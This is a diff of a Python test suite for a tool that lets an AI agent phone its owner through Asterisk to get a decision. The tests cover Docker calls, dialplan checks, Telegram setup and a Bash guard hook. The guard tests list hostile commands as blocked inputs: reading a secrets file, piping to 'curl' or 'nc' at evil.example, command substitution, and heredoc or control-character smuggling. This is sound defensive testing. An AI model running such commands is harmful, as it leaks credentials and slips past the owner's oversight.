+            self.asterisk(1, stderr=b"Error: No such container: asterisk").endpoint_available("PJSIP/phone")
+
+    def test_a_registered_contact_without_qualify_counts_as_available(self):
+        self.assertTrue(self.asterisk(0, b" Contact:  phone/sip:u@192.0.2.2:5060;ob   abc NonQual  nan\n").endpoint_available("PJSIP/phone"))
+
+    def test_removing_the_markers_before_a_call_must_succeed(self):
+        with self.assertRaises(ceo.DockerError):
+            self.asterisk(1, stderr=b"permission denied").remove("/x/answered", strict=True)
+        self.asterisk(1, stderr=b"permission denied").remove("/x/answered")  # plain cleanup stays best effort
+
+    def test_the_state_lock_does_not_leak_when_flock_fails(self):
+        import unittest.mock as mock
+        closed = []
+
+        class Handle:
+            def close(self):
+                closed.append(True)
+
+        with mock.patch("builtins.open", return_value=Handle()), mock.patch.object(ceo.fcntl, "flock", side_effect=OSError("boom")):
+            with mock.patch.object(Path, "mkdir"):
+                with self.assertRaises(OSError):
+                    ceo._state_lock(Path("/tmp/x"))
+        self.assertEqual(closed, [True])
+
+    def test_a_call_file_is_staged_then_abandoned_without_being_moved_in(self):
+        seen = []
+
+        class Result:
+            returncode, stdout, stderr = 0, b"", b""
+
+        def stop():
+            raise ceo.DialAbandoned()
+
+        docker = ceo.DockerAsterisk("asterisk", run=lambda command, **kwargs: seen.append(command) or Result())
+        with self.assertRaises(ceo.DialAbandoned):
+            docker.originate("ceo-x", "Channel: PJSIP/phone\n", before_commit=stop)
+        self.assertFalse(any("mv" in command for command in seen))
+        self.assertTrue(any("rm" in command for command in seen))  # staged file removed
+        seen.clear()
+        docker.originate("ceo-x", "Channel: PJSIP/phone\n", before_commit=lambda: None)
+        self.assertTrue(any("mv" in command for command in seen))
+
+    def test_stale_folders_older_than_a_day_are_swept(self):
+        seen = []
+
+        class Result:
+            returncode, stdout, stderr = 0, b"", b""
+
+        ceo.DockerAsterisk("asterisk", run=lambda command, **kwargs: seen.append(command) or Result()).sweep_stale()
+        command = seen[0]
+        self.assertIn("+1440", command)
+        self.assertEqual(command[command.index("find") + 1], "/var/spool/asterisk/ceo")
+
+
+class DockerAsteriskTests(unittest.TestCase):
+    def test_commands_run_as_the_asterisk_user_without_a_shell_from_text(self):
+        calls = []
+
+        class Result:
+            returncode = 0
+            stdout = b" 3 \n"
+
+        def run(command, **kwargs):
+            calls.append((command, kwargs.get("input")))
+            return Result()
+
+        asterisk = ceo.DockerAsterisk("asterisk", run=run)
+        asterisk.write_file("/var/spool/asterisk/ceo/x/prompt.wav", b"RIFF")
+        self.assertEqual(asterisk.read_file("/var/spool/asterisk/ceo/x/result"), "3")
+        asterisk.originate("ceo-abc", "Channel: PJSIP/phone\n")
+        self.assertEqual(calls[0][0][:6], ["docker", "exec", "-i", "-u", "asterisk", "asterisk"])
+        self.assertEqual(calls[0][1], b"RIFF")
+        self.assertEqual(calls[0][0][-2:], ["sh", "/var/spool/asterisk/ceo/x/prompt.wav"])
+        self.assertEqual(calls[-1][0][-3:], ["mv", "/var/spool/asterisk/tmp/ceo-abc.call", "/var/spool/asterisk/outgoing/ceo-abc.call"])
+
+    def test_a_timeout_while_staging_the_call_file_is_not_a_live_call(self):
+        class Result:
+            returncode = 0
+            stdout = b""
+
+        def run(command, **kwargs):
+            if "cat" in " ".join(command):
+                raise ceo.subprocess.TimeoutExpired(command, 60)
+            return Result()
+
+        asterisk = ceo.DockerAsterisk("asterisk", run=run)
+        with self.assertRaises(ceo.CallError) as caught:
+            asterisk.originate("ceo-abc", "Channel: PJSIP/phone\n")
+        self.assertNotIsInstance(caught.exception, ceo.MayBeLive)
+
+    def test_a_failing_cleanup_does_not_replace_the_reason_the_call_was_stopped(self):
+        class Result:
+            returncode = 0
+            stdout = b""
+
+        def run(command, **kwargs):
+            if command[-2:-1] == ["-rf"] or "rm" in command:
+                raise ceo.subprocess.TimeoutExpired(command, 60)
+            return Result()
+
+        def stop():
+            raise ceo.DialAbandoned()
+
+        asterisk = ceo.DockerAsterisk("asterisk", run=run)
+        with self.assertRaises(ceo.DialAbandoned):
+            asterisk.originate("ceo-abc", "Channel: PJSIP/phone\n", before_commit=stop)
+
+
+class DialplanTests(unittest.TestCase):
+    """The dialplan cannot run here, so pin the order of the steps that protect the decision."""
+
+    def setUp(self):
+        path = SCRIPT.parent.parent / "dialplan" / "ceo-ask.conf"
+        self.lines = [line.strip() for line in path.read_text().splitlines()]
+
+    def index(self, fragment):
+        matches = [i for i, line in enumerate(self.lines) if fragment in line]
+        self.assertEqual(len(matches), 1, fragment)
+        return matches[0]
+
+    def test_ids_are_validated_before_anything_else_runs(self):
+        self.assertLess(self.index('REGEX("^[0-9a-f]+$" ${CEO_ID})} = 0]?bad'), self.index("Answer()"))
+        self.assertLess(self.index('REGEX("^[1-8]$" ${CEO_OPTIONS})'), self.index("Answer()"))
+
+    def test_the_result_is_written_only_after_the_confirmation_key(self):
+        confirm_read = self.index("Read(CONFIRM")
+        gate = self.index('"${CONFIRM}" != "1"')
+        write = self.index("Set(FILE(${CEO_DIR}/result)=${CHOICE})")
+        self.assertLess(confirm_read, gate)
+        self.assertLess(gate, write)
+
+    def test_a_choice_must_be_a_valid_option_before_it_is_read_back(self):
+        self.assertLess(self.index('REGEX("^[1-8]$" ${CHOICE})'), self.index("Read(CONFIRM"))
+        self.assertLess(self.index("${CHOICE} > ${CEO_OPTIONS}"), self.index("Read(CONFIRM"))
+
+    def test_rounds_are_capped_and_the_end_of_call_marker_is_always_written(self):
+        self.index("${ROUND} > 3")
+        self.index("(giveup),Set(FILE(${CEO_DIR}/result)=undecided)")
+        self.assertTrue(any(line.startswith("exten => h,1") for line in self.lines))
+
+
+class CliTests(unittest.TestCase):
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(self.tmp.cleanup)
+        self.request = Path(self.tmp.name) / "request.json"
+        self.request.write_text(json.dumps({"question": "Ship it?", "options": ["Yes", "No"]}))
+        self.config = Path(self.tmp.name) / "config.json"
+        env_file = Path(self.tmp.name) / "env"
+        env_file.write_text("")
+        env_file.chmod(0o600)
+        self.config.write_text(json.dumps({"env_file": str(env_file)}))
+        self.originals = (ceo.DockerAsterisk, ceo.synthesize)
+        self.addCleanup(self.restore)
+        ceo.synthesize = fake_synth
+
+    def restore(self):
+        ceo.DockerAsterisk, ceo.synthesize = self.originals
+
+    def run_main(self, argv, script=None):
+        import contextlib
+        script = script if script is not None else ["2"]
+        ceo.DockerAsterisk = lambda container: FakeAsterisk(script)
+        out, err = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            code = ceo.main(["--config", str(self.config)] + argv)
+        return code, out.getvalue(), err.getvalue()
+
+    def test_a_confirmed_decision_exits_zero_and_prints_one_json_line(self):
+        code, out, _ = self.run_main(["ask", "--request", str(self.request)])
+        self.assertEqual(code, 0)
+        self.assertEqual(json.loads(out)["option"], "No")
+
+    def test_a_pending_decision_exits_three(self):
+        code, out, _ = self.run_main(["ask", "--request", str(self.request)], script=["undecided"])
+        self.assertEqual(code, 3)
+        self.assertEqual(json.loads(out)["status"], "undecided")
+
+    def test_an_encoding_failure_on_output_is_reported_as_such(self):
+        import contextlib
+
+        class AsciiOut(io.StringIO):
+            def write(self, text):
+                text.encode("ascii")
+                return super().write(text)
+
+        self.request.write_text(json.dumps({"question": "¿Seguimos?", "options": ["Sí", "No"]}))
+        ceo.DockerAsterisk = lambda container: FakeAsterisk(["1"])
+        err = io.StringIO()
+        with contextlib.redirect_stdout(AsciiOut()), contextlib.redirect_stderr(err):
+            code = ceo.main(["--config", str(self.config), "ask", "--request", str(self.request)])
+        self.assertEqual(code, 1)
+        self.assertIn("encoding", err.getvalue())
+        self.assertNotIn("configured path", err.getvalue())
+
+    def test_a_state_file_path_with_a_nul_byte_is_an_error_line_not_a_traceback(self):
+        env_file = Path(self.tmp.name) / "env"
+        self.config.write_text(json.dumps({"env_file": str(env_file), "state_file": "bad\u0000path"}))
+        code, out, err = self.run_main(["ask", "--request", str(self.request)])
+        self.assertEqual(code, 1)
+        self.assertTrue(err.startswith("ERROR:"))
+        self.assertNotIn("Traceback", err)
+
+    def test_input_problems_exit_one_with_an_error_line_and_no_traceback(self):
+        for argv in (["ask", "--request", str(Path(self.tmp.name) / "missing.json")],):
+            code, out, err = self.run_main(argv)
+            self.assertEqual(code, 1)
+            self.assertTrue(err.startswith("ERROR:"))
+            self.assertNotIn("Traceback", err)
+        bad = Path(self.tmp.name) / "bad.json"
+        bad.write_text("{")
+        code, _, err = self.run_main(["ask", "--request", str(bad)])
+        self.assertEqual(code, 1)
+        self.assertTrue(err.startswith("ERROR:"))
+
+    def test_test_call_reads_the_public_domain_passage_and_can_ignore_quiet_hours(self):
+        import unittest.mock as mock
+
+        class FakeDatetime:
+            @staticmethod
+            def now(zone=None):
+                return datetime(2026, 1, 1, 3, 0)
+
+        self.config.write_text(json.dumps({"env_file": str(Path(self.tmp.name) / "env"), "quiet_start": "22:00", "quiet_end": "07:00"}))
+        spoken = []
+        ceo.synthesize = lambda host, port, text, **kw: spoken.append(text) or fake_synth(host, port, text)
+        with mock.patch.object(ceo, "datetime", FakeDatetime):
+            code, out, _ = self.run_main(["test-call"], script=["1"])
+            self.assertEqual((code, json.loads(out)["status"]), (3, "deferred"))
+            code, out, _ = self.run_main(["test-call", "--ignore-quiet-hours"], script=["1"])
+        self.assertEqual((code, json.loads(out)["status"]), (0, "decided"))
+        self.assertTrue(any("Cervantes" in text and "En un lugar de la Mancha" in text for text in spoken))
+
+    def test_the_test_passage_is_a_valid_request(self):
+        clean = ceo.validate_request({"question": ceo.TEST_PASSAGE, "options": ceo.TEST_OPTIONS})
+        self.assertIn("dominio público", clean["question"])
+
+    def test_check_reports_a_registered_phone(self):
+        for registered, expected in ((True, 0), (False, 0)):
+            with self.subTest(registered=registered):
+                class Fake(FakeAsterisk):
+                    def endpoint_available(self, endpoint):
+                        return registered
+
+                import contextlib
+                ceo.DockerAsterisk = lambda container: Fake([])
+                out = io.StringIO()
+                with contextlib.redirect_stdout(out):
+                    code = ceo.main(["--config", str(self.config), "check"])
+                self.assertEqual(code, expected)
+                self.assertIn("speech: ok", out.getvalue())
+
+    def test_check_exits_1_only_for_a_real_failure_not_for_a_sleeping_phone(self):
+        import contextlib
+
+        class Broken(FakeAsterisk):
+            def endpoint_available(self, endpoint):
+                raise ceo.CallError("docker is not reachable")
+
+        ceo.DockerAsterisk = lambda container: Broken([])
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out):
+            code = ceo.main(["--config", str(self.config), "check"])
+        self.assertEqual(code, 1)
+        self.assertIn("FAILED", out.getvalue())
+
+    def run_ask_cli(self, *args, stdin=None):
+        import contextlib
+        err = io.StringIO()
+        with contextlib.redirect_stderr(err):
+            code = ceo.main(["--config", str(self.config), "ask", *args])
+        return code, err.getvalue()
+
+    def test_a_request_must_be_a_small_regular_file(self):
+        code, err = self.run_ask_cli("--request", "/dev/zero")
+        self.assertEqual(code, 1)
+        self.assertIn("ERROR:", err)
+        big = Path(self.tmp.name) / "big.json"
+        big.write_bytes(b" " * (ceo.MAX_REQUEST_BYTES + 1))
+        code, err = self.run_ask_cli("--request", str(big))
+        self.assertEqual(code, 1)
+        self.assertIn("ERROR:", err)
+        code, err = self.run_ask_cli("--request", str(Path(self.tmp.name)))  # a directory
+        self.assertEqual(code, 1)
+
+    def test_the_stdin_limit_counts_bytes_not_characters(self):
+        import unittest.mock as mock
+        text = "é" * (ceo.MAX_REQUEST_BYTES // 2 + 10)  # fewer characters than the limit, more bytes
+        with mock.patch.object(ceo.sys, "stdin", io.StringIO(text)):
+            code, err = self.run_ask_cli("--request", "-")
+        self.assertEqual(code, 1)
+        self.assertIn("longer than", err)
+
+    def test_stdin_is_decoded_as_utf8_whatever_the_locale(self):
+        import unittest.mock as mock
+
+        class LocaleStdin:
+            buffer = io.BytesIO("¿puedes atender?".encode("utf-8"))
+
+            def read(self, n=-1):
+                return "Â¿puedes atender?"  # what a latin-1 locale would produce
+
+        with mock.patch.object(ceo.sys, "stdin", LocaleStdin()):
+            self.assertEqual(ceo.read_request("-"), "¿puedes atender?")
+
+    def test_a_huge_stdin_request_is_cut_off(self):
+        import unittest.mock as mock
+        with mock.patch.object(ceo.sys, "stdin", io.StringIO(" " * (ceo.MAX_REQUEST_BYTES + 10))):
+            code, err = self.run_ask_cli("--request", "-")
+        self.assertEqual(code, 1)
+        self.assertIn("ERROR:", err)
+
+    def test_deeply_nested_json_is_a_clean_error(self):
+        path = Path(self.tmp.name) / "deep.json"
+        path.write_text("[" * 5000)
+        code, err = self.run_ask_cli("--request", str(path))
+        self.assertEqual(code, 1)
+        self.assertIn("ERROR:", err)
+
+    def test_the_scripts_are_executable_as_the_skill_shows_them(self):
+        for name in ("ceo_call.py", "guard_bash.py"):
+            self.assertTrue(os.access(SCRIPT.parent / name, os.X_OK), name)
+
+    def test_a_request_that_is_not_utf8_is_a_clean_error(self):
+        import contextlib
+        path = Path(self.tmp.name) / "bad.json"
+        path.write_bytes(b"\xff\xfe{")
+        err = io.StringIO()
+        with contextlib.redirect_stderr(err):
+            code = ceo.main(["--config", str(self.config), "ask", "--request", str(path)])
+        self.assertEqual(code, 1)
+        self.assertIn("ERROR:", err.getvalue())
+
+    def test_check_says_a_missing_phone_is_handled_by_ask(self):
+        import contextlib
+
+        class Asleep(FakeAsterisk):
+            def endpoint_available(self, endpoint):
+                return False
+
+        ceo.DockerAsterisk = lambda container: Asleep([])
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out):
+            ceo.main(["--config", str(self.config), "check"])
+        self.assertIn("NOT registered", out.getvalue())
+        self.assertIn("heads-up", out.getvalue())
+
+    def test_telegram_setup_ignores_unhashable_chat_ids(self):
+        updates = [{"message": {"chat": {"id": [1, 2], "type": "private"}}}, {"message": {"chat": {"id": 5, "type": "private"}}}]
+        code, out = self.run_telegram_setup(self.answers(updates))
+        self.assertEqual(code, 0)
+        self.assertIn("CEO_TELEGRAM_CHAT_ID=5", out)
+
+    def run_telegram_setup(self, answers):
+        """answers maps a bot API method to the JSON the service returns."""
+        import contextlib
+        import unittest.mock as mock
+        env = Path(self.tmp.name) / "env"
+        env.write_text("CEO_TELEGRAM_TOKEN=SECRETTOKEN\n")
+        os.chmod(env, 0o600)
+
+        class Response(io.BytesIO):
+            def __enter__(self):
+                return self
+
+            def __exit__(self, *a):
+                return False
+
+        def fake_urlopen(url, timeout):
+            method = url.rsplit("/", 1)[1]
+            return Response(json.dumps(answers[method]).encode())
+
+        out = io.StringIO()
+        with mock.patch.object(ceo.urllib.request, "urlopen", fake_urlopen):
+            with contextlib.redirect_stdout(out):
+                code = ceo.main(["--config", str(self.config), "telegram-setup"])
+        return code, out.getvalue()
+
+    @staticmethod
+    def answers(updates, webhook=""):
+        return {
+            "getMe": {"ok": True, "result": {"username": "my_bot"}},
+            "getWebhookInfo": {"ok": True, "result": {"url": webhook}},
+            "getUpdates": {"ok": True, "result": updates},
+        }
+
+    def test_telegram_setup_prints_the_chat_id_and_never_the_token(self):
+        update = {"message": {"chat": {"id": 4242, "type": "private", "first_name": "Someone"}}}
+        code, out = self.run_telegram_setup(self.answers([update]))
+        self.assertEqual(code, 0)
+        self.assertIn("@my_bot", out)
+        self.assertIn("\nCEO_TELEGRAM_CHAT_ID=4242\n", out)  # nothing else on the line: it can be copied as it is
+        self.assertNotIn("SECRETTOKEN", out)
+        self.assertNotIn("Someone", out)
+
+    def test_telegram_setup_without_messages_names_the_bot_to_write_to(self):
+        code, out = self.run_telegram_setup(self.answers([]))
+        self.assertEqual(code, 1)
+        self.assertIn("@my_bot", out)
+        self.assertIn("press Start", out)
+
+    def test_telegram_setup_reports_a_webhook_that_blocks_updates(self):
+        code, out = self.run_telegram_setup(self.answers([], webhook="https://example.invalid/hook"))
+        self.assertEqual(code, 1)
+        self.assertIn("webhook", out)
+        self.assertNotIn("example.invalid", out)
+
+    def test_telegram_setup_reads_other_kinds_of_update(self):
+        code, out = self.run_telegram_setup(self.answers([{"my_chat_member": {"chat": {"id": 77, "type": "private"}}}]))
+        self.assertIn("CEO_TELEGRAM_CHAT_ID=77", out)
+
+    def test_telegram_setup_non_object_body_is_a_clean_error(self):
+        import contextlib
+        import unittest.mock as mock
+        env = Path(self.tmp.name) / "env"
+        env.write_text("CEO_TELEGRAM_TOKEN=SECRETTOKEN\n")
+        os.chmod(env, 0o600)
+
+        class Response(io.BytesIO):
+            def __enter__(self):
+                return self
+
+            def __exit__(self, *a):
+                return False
+
+        err = io.StringIO()
+        with mock.patch.object(ceo.urllib.request, "urlopen", lambda url, timeout: Response(b"null")), contextlib.redirect_stderr(err):
+            code = ceo.main(["--config", str(self.config), "telegram-setup"])
+        self.assertEqual(code, 1)
+        self.assertIn("ERROR:", err.getvalue())
+
+    def test_telegram_setup_unexpected_result_shapes_are_clean_errors(self):
+        import contextlib
+        for answers in (
+            {"getMe": {"ok": True, "result": []}},
+            {"getMe": {"ok": True, "result": {"username": "b"}}, "getWebhookInfo": {"ok": True, "result": [1]}},
+            {"getMe": {"ok": True, "result": {"username": "b"}}, "getWebhookInfo": {"ok": True, "result": {"url": ""}}, "getUpdates": {"ok": True, "result": {"a": 1}}},
+        ):
+            with self.subTest(answers=answers):
+                err = io.StringIO()
+                with contextlib.redirect_stderr(err):
+                    code, _ = self.run_telegram_setup(answers)
+                self.assertEqual(code, 1)
+                self.assertIn("ERROR:", err.getvalue())
+
+    def test_telegram_setup_warns_when_several_chats_wrote_to_the_bot(self):
+        updates = [{"message": {"chat": {"id": 1, "type": "private"}}}, {"message": {"chat": {"id": 2, "type": "private"}}}]
+        code, out = self.run_telegram_setup(self.answers(updates))
+        self.assertEqual(code, 0)
+        self.assertIn("2 chats", out)
+        self.assertIn("CEO_TELEGRAM_CHAT_ID=1", out)
+        self.assertIn("CEO_TELEGRAM_CHAT_ID=2", out)
+        self.assertLess(out.index("=1"), out.index("=2"))  # oldest first, newest last
+        self.assertIn("most recent", out)
+
+    def test_telegram_setup_refused_token_is_a_clean_error(self):
+        import contextlib
+        import unittest.mock as mock
+        env = Path(self.tmp.name) / "env"
+        env.write_text("CEO_TELEGRAM_TOKEN=SECRETTOKEN\n")
+        os.chmod(env, 0o600)
+
+        def refuse(url, timeout):
+            raise OSError("401 for " + url)
+
+        err = io.StringIO()
+        with mock.patch.object(ceo.urllib.request, "urlopen", refuse), contextlib.redirect_stderr(err):
+            code = ceo.main(["--config", str(self.config), "telegram-setup"])
+        self.assertEqual(code, 1)
+        self.assertNotIn("SECRETTOKEN", err.getvalue())
+
+
+class GuardTests(unittest.TestCase):
+    @classmethod
+    def setUpClass(cls):
+        path = SCRIPT.parent / "guard_bash.py"
+        spec_ = importlib.util.spec_from_file_location("guard_bash", path)
+        cls.guard = importlib.util.module_from_spec(spec_)
+        spec_.loader.exec_module(cls.guard)
+
+    def test_the_script_invocations_are_allowed(self):
+        for command in (
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check",
+            "python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check",
+            "python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config /home/u/.config/ceo-call/config.json check",
+            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' --config '~/.config/ceo-call/config.json' check",
+            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' --config '~/.config/ceo-call/config.json' ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
+            "/home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request - <<'CEO_REQUEST'\n{\"question\": \"Ship it?\", \"options\": [\"a\", \"b\"]}\nCEO_REQUEST",
+        ):
+            with self.subTest(command=command):
+                self.assertTrue(self.guard.allowed(command, home="/home/u", hosts=("myhost",)))
+
+    def test_an_ssh_alias_must_be_one_the_owner_listed(self):
+        command = "ssh other python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' --config '~/.config/ceo-call/config.json' check"
+        self.assertFalse(self.guard.allowed(command, home="/home/u", hosts=("myhost",)))
+        self.assertFalse(self.guard.allowed(command.replace("other", "myhost"), home="/home/u", hosts=()))
+        self.assertTrue(self.guard.allowed(command.replace("other", "myhost"), home="/home/u", hosts=("myhost",)))
+
+    def test_the_host_list_is_read_from_the_owners_config_dir_and_fails_closed(self):
+        import tempfile as _t
+        with _t.TemporaryDirectory() as home:
+            self.assertEqual(self.guard.read_hosts(home), ())  # no file: no remote host is allowed
+            folder = Path(home) / ".config" / "ceo-call"
+            folder.mkdir(parents=True)
+            (folder / "hosts").write_text("# the telephony host\nmyhost\n\n bad alias \nsecond-host\n")
+            self.assertEqual(self.guard.read_hosts(home), ("myhost", "second-host"))
+
+    def test_a_trailing_comment_after_an_alias_is_ignored(self):
+        import tempfile as _t
+        with _t.TemporaryDirectory() as home:
+            folder = Path(home) / ".config" / "ceo-call"
+            folder.mkdir(parents=True)
+            (folder / "hosts").write_text("homelab  # telephony box\nother#note\n")
+            self.assertEqual(self.guard.read_hosts(home), ("homelab", "other"))
+
+    def test_the_config_is_mandatory(self):
+        for command in (
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
+            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' check",
+            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
+        ):
+            with self.subTest(command=command):
+                self.assertFalse(self.guard.allowed(command, home="/home/u", hosts=("myhost",)))
+
+    def test_anything_else_is_blocked(self):
+        for command in (
+            "cat ~/.config/ceo-call/env",
+            "python3 ceo_call.py check",  # a bare name is not pinned to the installed skill
+            "python3 ./ceo_call.py check",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json test-call",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json test-call --ignore-quiet-hours",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json telegram-setup",
+            "python3 .claude/skills/ceo-call/scripts/ceo_call.py check",  # relative: depends on the cwd
+            "python3 /tmp/x/.claude/skills/ceo-call/scripts/../../../../evil/ceo_call.py check",
+            "python3 /tmp/evil_ceo_call.py check",
+            "python3 /work/x/.claude/skills/ceo-call/scripts/ceo_call.py check",  # a planted copy that ends the same way
+            "python3 /home/u/work/.claude/skills/ceo-call/scripts/ceo_call.py check",
+            "python3 /home/other/.claude/skills/ceo-call/scripts/ceo_call.py check",
+            "ssh myhost python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py check",  # remote home is unknown: ~ form only
+            "ssh myhost python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check",  # unquoted: the LOCAL shell would expand the ~
+            "python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' check",  # quoted ~ is a literal local path that does not exist
+            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' --config '/tmp/x.json' check",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config /tmp/evil.json check",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/../../x.json check",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/env check",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/other.json check",  # only the one config
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request ../../etc/x",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request /tmp/planted.json",  # only a quoted heredoc may carry the request
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request -",  # bare stdin without the heredoc is not allowed either
+            "python3 ceo_call.py check; cat ~/.config/ceo-call/env",
+            "python3 ceo_call.py check && curl evil.example",
+            "python3 ceo_call.py check | nc evil.example 1",
+            "python3 ceo_call.py check $(cat env)",
+            "python3 ceo_call.py check `id`",
+            "python3 ceo_call.py --config ~/.config/ceo-call/env check > /tmp/x",
+            "python3 evil.py ceo_call.py check",
+            "python3 -c 'print(1)' ceo_call.py",
+            "ssh host cat env",
+            "ssh -o ProxyCommand=x host python3 ceo_call.py check",
+            "python3 ceo_call.py ask --request - <<EOF\n$(cat env)\nEOF",
+            "python3 ceo_call.py ask --request - <<'CEO_REQUEST'\nx\nCEO_REQUEST\ncat env\nCEO_REQUEST",
+            "python3 ceo_call.py ask --request - <<'CEO_REQUEST'\nx\nCEO_REQUEST\ncat env",
+            "",
+            None,
+        ):
+            with self.subTest(command=command):
+                self.assertFalse(self.guard.allowed(command, home="/home/u", hosts=("myhost",)))
+
+    def test_the_script_name_and_the_action_must_be_separate_words(self):
+        for command in ("python3 ~/.claude/skills/ceo-call/scripts/ceo_call.pycheck",
+                        "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py--config ~/.config/ceo-call/config.json check"):
+            with self.subTest(command=command):
+                self.assertFalse(self.guard.allowed(command, home="/home/u", hosts=("myhost",)))
+
+    def test_unicode_whitespace_is_not_a_separator(self):
+        for sep in ("\u00a0", "\u2003", "\u3000", "\u0085"):
+            with self.subTest(sep=repr(sep)):
+                self.assertFalse(self.guard.allowed("python3" + sep + "~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check", home="/home/u"))
+                self.assertFalse(self.guard.allowed("python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py" + sep + "--config ~/.config/ceo-call/config.json check", home="/home/u"))
+
+    def test_control_characters_cannot_smuggle_a_second_command(self):
+        ok = "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST"
+        self.assertTrue(self.guard.allowed(ok, home="/home/u"))
+        head = "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request - <<'CEO_REQUEST'"
+        for command in (
+            # bash would take "CEO_REQUEST\r" as the delimiter, so the cat below would run
+            head + "\r\n{}\nCEO_REQUEST\r\ncat ~/.config/ceo-call/env\nCEO_REQUEST",
+            head + "\n{}\nCEO_REQUEST\r\ncat ~/.config/ceo-call/env\nCEO_REQUEST",
+            head + "\n{}\r\nCEO_REQUEST",
+            head + " \n{}\nCEO_REQUEST",
+            head + "\t\n{}\nCEO_REQUEST",
+            head + "\n{}\nCEO_REQUEST\x00",
+            head + "\n{}\nCEO_REQUEST\x0b",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check\r",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check\ncat env",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py\x0b--config ~/.config/ceo-call/config.json check",
+        ):
+            with self.subTest(command=command):
+                self.assertFalse(self.guard.allowed(command, home="/home/u", hosts=("myhost",)))
+
+    def test_the_block_message_lists_only_what_is_allowed(self):
+        import subprocess
+        out = subprocess.run(["python3", str(SCRIPT.parent / "guard_bash.py")], input=b'{"tool_input":{"command":"ls"}}', capture_output=True)
+        self.assertNotIn(b"test-call", out.stderr)
+
+    def test_every_command_form_the_skill_shows_the_agent_is_one_the_guard_accepts(self):
+        skill = (SCRIPT.parents[1] / "SKILL.md").read_text()
+        block = skill.split("The exact forms (everything else is refused):", 1)[1].split("```")[1]
+        lines = block.strip("\n").split("\n")
+        commands = [lines[0], "\n".join(lines[1:])]
+        self.assertTrue(commands[0].endswith("check") and "<<'CEO_REQUEST'" in commands[1])
+        for command in commands:
+            with self.subTest(command=command):
+                self.assertTrue(self.guard.allowed(command, home="/home/u", hosts=()))
+
+    def test_the_skill_does_not_claim_a_repository_cannot_change_the_hook(self):
+        skill = (SCRIPT.parents[1] / "SKILL.md").read_text()
+        self.assertNotIn("a repository cannot swap in a permissive guard", skill)
+        self.assertIn("agent definition", skill)
+
+    def test_a_prompt_cannot_make_the_speech_buffer_huge(self):
+        self.assertLessEqual(ceo.MAX_PCM_BYTES, 8 * 1024 * 1024)
+
+    def test_the_conversion_cap_comment_does_not_overclaim(self):
+        source = SCRIPT.read_text()
+        self.assertNotIn("also bounds the conversion time", source)
+        self.assertIn("CONVERT_BUDGET_S", source)
+
+    def test_the_agent_is_told_the_heredoc_form_and_what_to_report_without_json(self):
+        agent = (SCRIPT.parents[3] / "agents" / "claudio.md").read_text()
+        self.assertIn("<<'CEO_REQUEST'", agent)
+        self.assertIn("Agent safety", agent)
+        self.assertNotIn("needs the user's authority", agent)  # only the two cases council-policy names
+        self.assertIn("no JSON", agent)
+
+    def test_the_agent_is_told_to_run_ask_in_the_background(self):
+        agent = (SCRIPT.parents[3] / "agents" / "claudio.md").read_text()
+        self.assertIn("run_in_background", agent)
+
+    def test_the_agent_preloads_the_skill_and_gets_the_host_from_the_brief(self):
+        agent = (SCRIPT.parents[3] / "agents" / "claudio.md").read_text()
+        self.assertIn("skills: ceo-call\n", agent)
+        self.assertIn("ssh alias", agent)
+
+    def test_the_hook_exit_codes_fail_closed(self):
+        import subprocess
+        guard = str(SCRIPT.parent / "guard_bash.py")
